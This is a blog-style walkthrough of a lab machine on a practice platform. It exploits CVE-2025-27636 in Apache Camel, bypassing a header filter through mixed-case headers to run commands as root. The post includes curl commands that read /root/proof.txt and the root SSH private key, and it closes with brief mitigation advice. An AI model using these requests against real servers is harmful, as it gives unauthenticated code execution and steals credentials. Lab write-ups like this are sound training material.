---
layout: post
title: PG Practice CVE-2025-27636
---

PG-Practice: CVE-2025-27636 (Apache Camel Header Casing RCE)

## Service Enumeration

```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp open  http    Jetty 12.0.16
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE CONNECT PATCH
|_http-server-header: Jetty(12.0.16)
|_http-title: CamelHead - Desert Transport Solutions<LINES>...
  -C, --filter-status <STATUS_CODE>...        Filter out status codes (deny
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

![enum1](/assets/images/cve_2025_27636/enum1.png)

![enum2](/assets/images/cve_2025_27636/enum2.png)

The target is running **Apache Camel v4.1.0**, as is evident from the footer of the web page.  
Apache Camel is an integration framework that routes messages between components using Enterprise Integration Patterns (EIPs).

Tech stack 
![enum3](/assets/images/cve_2025_27636/enum3.png)

The target web service is **Jetty 12.0.16**. Jetty is a Java-based web server and servlet container.

Accessing the */command-center* endpoint returns a plain response: *root*, suggesting potential server-side command execution or misconfiguration .

![enum4](/assets/images/cve_2025_27636/enum4.png)

Directory brute forcing
![enum5](/assets/images/cve_2025_27636/enum5.png)
Directory brute forcing revealed only a single endpoint */command-center*

## Vulnerability Identification

After researching on the specific version, i found a public Poc

`https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC`

Apache Camel's **exec:** component enables command execution through HTTP headers such as **CamelExecCommandExecutable**. However, due to **improper normalization of header casing**, filters intended to block dangerous headers can be bypassed by using mixed-case variants like **CAMelExecCommandExecUtable**. This behavior allows unauthenticated attackers to achieve Remote Code Execution (RCE) by supplying arbitrary commands

The header used for achieving RCE

|Name                            | Description                                                                            |Type    |                             
|--------------------------------|----------------------------------------------------------------------------------------|--------|
| **CamelExecCommandExecutable** | The name of the system command that will be executed. Overrides executable in the URI. | String |


## Exploitation
![exp1](/assets/images/cve_2025_27636/exp1.png)
the process is running as root
Initially, argument passing didn’t work until I reviewed Camel’s documentation.

|Name                      | Description                                                                            |Type    |                             
|--------------------------|----------------------------------------------------------------------------------------|--------|
| **CamelExecCommandArgs** | Command-line argument(s) to pass to the executed process. The argument(s) is/are used literally - no quoting is applied. Overrides any existing args in the URI. | List or String |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- |

reading the proof.txt
```bash
curl http://192.168.137.120/command-center -H "CAMelExecCommandExecUtable: cat" -H "camElExeccomMandArGs: /root/proof.txt"
```

## To escalate further

```bash
curl http://192.168.137.120/command-center -H "CAMelExecCommandExecUtable: cat" -H "camElExeccomMandArGs: /root/.ssh/id_rsa
```

![post1](/assets/images/cve_2025_27636/post1.png)
![post2](/assets/images/cve_2025_27636/post2.png)

## Mitigation
- Upgrade apache to the latest version
- Implement strict firewall rules
- Strict input sanitization and Header Validation

## Reference
- [Github POC](https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC)
- [Apache Documentation](https://camel.apache.org/components/4.10.x/exec-component.html#_message_headers)
